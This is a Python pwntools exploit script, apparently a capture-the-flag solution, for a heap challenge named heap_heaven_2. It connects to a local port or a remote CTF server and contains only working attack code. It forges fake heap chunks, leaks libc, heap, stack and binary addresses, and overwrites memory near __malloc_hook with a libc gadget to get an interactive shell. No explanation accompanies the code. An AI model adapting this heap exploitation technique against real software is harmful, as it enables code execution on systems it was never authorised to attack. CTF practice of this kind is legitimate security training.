#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./heap_heaven_2"
#os.environ={"LD_LIBRARY_PATH":"/dbg64/lib/"}
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
heap_add=0
stack_add=0
if len(sys.argv)==1:
    r=remote("127.0.0.1",60001)
    #r=process(pwn_file)
    #libc=ELF("/dbg64/lib/libc.so.6")
    pid=0
else:
    r=remote("arcade.fluxfingers.net",1809)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("stack add:0x%x"%stack_add)
    log.debug("elf address:0x%x"%elf.address)
    log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def add(off,con):
    r.sendlineafter("exit\n","1")
    r.sendlineafter("How much do you want to write?",str(len(con)))
    r.sendlineafter("At which offset?",str(off))
    r.send(con)

def free(off):
    r.sendlineafter("exit\n","3")
    r.sendlineafter("At which offset do you want to free?\n",str(off))

def leak(off):
    r.sendlineafter("exit\n","4")
    r.sendlineafter("At which offset do you want to leak?\n",str(off))
    return r.recvline()[:-1]

add(0x1000,p64(0)+p64(0x501))
add(0x1500,p64(0)+p64(0x101))
add(0x1608,p64(0x501))
free(0x1010)
f={
    8:p64(0x21),
    0x28:p64(0x21),
}
add(0x1b00,fit(f,filler="\x00"))
free(0x1610)
add(0x1610,"\x11")
libc.address=(u64(leak(0x1610).ljust(8,"\x00"))<<0x8)-libc.sym["__malloc_hook"]-0x70
add(0x1610,"\x19")
heap_add=(u64(leak(0x1610).ljust(8,"\x00"))<<8)-0x600-0x1000
add(0x1610,"\x00")
# leak elf address using stack .... fck
add(0x1010,p64(libc.sym["environ"]))
stack_add=u64(leak(0x1010).ljust(8,"\x00"))
add(0x1010,p64(stack_add-0x30))
elf.address=u64(leak(0x1010).ljust(8,"\x00"))-0x111e
add(0x1010,p64(libc.sym["__malloc_hook"]+0x70))
mmap=elf.address+0x4048
add(0x1508,p64(0x100))
free(0x1510)

add(0,p64(0x0)+p64(0x501)+p64(mmap-0x18)+p64(mmap-0x10))
add(0x500,p64(0x500)+p64(0x500))
add(0xa00,p64(0)+p64(0x21)+p64(0)*3+p64(0x21))
add(0x100,p64(heap_add+0x108)+p64(libc.address+0xE75F0)*2)
free(0x510)
add(0x10,p64(heap_add+0x100))
r.interactive()


